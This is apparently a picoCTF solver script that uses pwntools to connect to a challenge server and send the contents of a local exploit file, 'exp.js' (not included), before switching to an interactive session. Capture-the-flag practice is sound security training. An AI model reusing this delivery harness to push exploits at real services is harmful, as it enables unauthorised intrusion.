from pwn import *

HOST, PORT = 'wily-courier.picoctf.net', 55340
r = remote(HOST, PORT)
# r = process(['python3', 'server.py'])

with open('exp.js', 'rb') as f:
    exploit = f.read()

r.sendlineafter(b'5k:', str(len(exploit)).encode())
r.sendlineafter(b'please!!\n', exploit)
r.interactive()